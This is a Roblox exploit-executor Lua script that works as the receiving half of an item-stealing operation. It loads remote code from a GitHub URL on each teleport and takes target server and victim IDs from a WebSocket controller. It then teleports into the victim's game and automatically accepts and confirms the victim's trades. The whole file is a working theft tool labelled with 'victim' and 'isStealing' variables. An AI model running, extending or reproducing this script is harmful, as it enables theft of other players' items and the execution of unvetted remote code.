repeat task.wait() until game:IsLoaded()

queue_on_teleport([[
    loadstring("https://raw.githubusercontent.com/aibabylaugh/catsaken-real-script-not-assets/main/qu.lua")()
]])

local LocalPlayer = game:GetService("Players").LocalPlayer

do
    local Lplr = game:GetService("Players").LocalPlayer
    repeat task.wait() until Lplr:FindFirstChild("PlayerGui") and
        Lplr.PlayerGui:FindFirstChild("LoadingScreenGui") and
        Lplr.PlayerGui.LoadingScreenGui:FindFirstChild("LoadingMessage") and
        Lplr.PlayerGui.LoadingScreenGui.LoadingMessage.Visible == false
end
local Gui = LocalPlayer.PlayerGui:WaitForChild("ScreenGui", math.huge)
local Tradelayer = Gui:WaitForChild("TradeLayer", math.huge)

local HttpService = game:GetService("HttpService")

local ws = WebSocket.connect("ws://192.168.0.76:8765")

local filename = "lizardautojoindata.json"

local isStealing = false
local autjoindata = isfile(filename) and readfile(filename)
if autjoindata then
    local json = HttpService:JSONDecode(autjoindata)
    if game.JobId == json.JobId then
        local victim
        for i, plr in pairs(game:GetService("Players"):GetPlayers()) do
            if plr.UserId == json.UserId then
                victim = plr
                break
            end
        end
        if victim then
            local vname = victim.Name
            local VictimIsTrading
            local StealerIsTrading
            isStealing = true
            while game:GetService("Players"):FindFirstChild(vname) and task.wait(1) do
                local tradeframe = Tradelayer:FindFirstChild("IncomingTradeRequestFrame")
                warn("Waiting", tradeframe)
                if tradeframe then
                    if tradeframe:WaitForChild("TextLabel").Text:match("(.+) would like to Trade") == vname then
                        warn("accepting trade from " .. vname)
                        firesignal(tradeframe.ButtonAccept.MouseButton1Click)
                    else
                        print("who's this?")
                        firesignal(tradeframe.ButtonDeny.MouseButton1Click)
                    end
                end
                local tradinggui = Tradelayer:FindFirstChild("TradeAnchorFrame")
                if tradinggui then
                    warn("In trade", tradinggui)
                    VictimIsTrading = victim:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
                    StealerIsTrading = LocalPlayer:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
                    while VictimIsTrading.Value and StealerIsTrading.Value and task.wait(1) do
                        warn("waiting for accept")
                        local acceptbutton = tradinggui.TradeFrame.ButtonAccept.ButtonTop
                        if acceptbutton.TextLabel.Text ~= "Unaccept" then
                            firesignal(acceptbutton.MouseButton1Click)
                            task.wait(1.5)
                        end
                    end
                    warn("done")
                    break
                end
            end
        else
            warn("player not found yet")
        end
    else
        warn("for some reason we're in the wrong game")
    end
end
repeat task.wait() until not isStealing

ws.OnMessage:Connect(function(msg)
    local json = HttpService:JSONDecode(msg)
    if not json then return warn("not json") end
    local jobId = json.JobId
    local userid = json.UserId
    if not jobId or not userid then return warn("missing keys") end
    writefile(filename, msg)
    wait(1)
    game:GetService("TeleportService"):TeleportToPlaceInstance(1537690962, jobId, LocalPlayer)
end)

ws.OnClose:Connect(function()
    print("Disconnected from server")
end)

while task.wait() do end -- keep alive
